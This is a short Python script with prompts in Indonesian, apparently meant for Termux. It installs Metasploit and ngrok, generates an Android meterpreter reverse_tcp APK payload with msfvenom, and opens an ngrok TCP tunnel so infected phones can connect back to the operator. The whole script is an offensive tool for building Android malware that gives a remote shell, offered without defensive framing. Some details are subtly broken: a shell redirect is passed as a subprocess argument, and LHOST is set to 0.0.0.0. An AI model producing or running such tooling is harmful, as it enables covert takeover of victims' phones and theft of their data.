import os
import subprocess

def install_dependencies():
  # Install metasploit framework
  subprocess.run(["pkg", "update"])
  subprocess.run(["pkg", "install", "-y", "metasploit"])

  # Install ngrok
  subprocess.run(["wget", "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"])
  subprocess.run(["unzip", "ngrok-stable-linux-amd64.zip"])
  subprocess.run(["mv", "ngrok", "/usr/local/bin/"])
  subprocess.run(["rm", "ngrok-stable-linux-amd64.zip"])

def create_payload(payload_name, payload_location, ngrok_port):
  # Generate payload meterpreter Android
  subprocess.run(["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST=0.0.0.0", f"LPORT={ngrok_port}", f"R", f">{payload_location}/{payload_name}.apk"])

def run_ngrok(ngrok_port):
  # Run ngrok on specified port
  subprocess.run(["ngrok", "tcp", f"{ngrok_port}"])

# Check if metasploit framework is installed
if not os.path.exists("/data/data/com.termux/files/usr/bin/msfvenom"):
  # Prompt user to install dependencies
  install = input("Metasploit framework dan ngrok tidak terinstall. Apakah Anda ingin menginstallnya sekarang? (y/n) ")
  if install.lower() == "y":
    install_dependencies()
  else:
    exit()

# Prompt user for payload details
payload_name = input("Masukkan nama file payload: ")
payload_location = input("Masukkan lokasi file payload: ")
ngrok_port = input("Masukkan port ngrok: ")

# Create payload
create_payload(payload_name, payload_location, ngrok_port)

# Run ngrok
run_ngrok(ngrok_port)
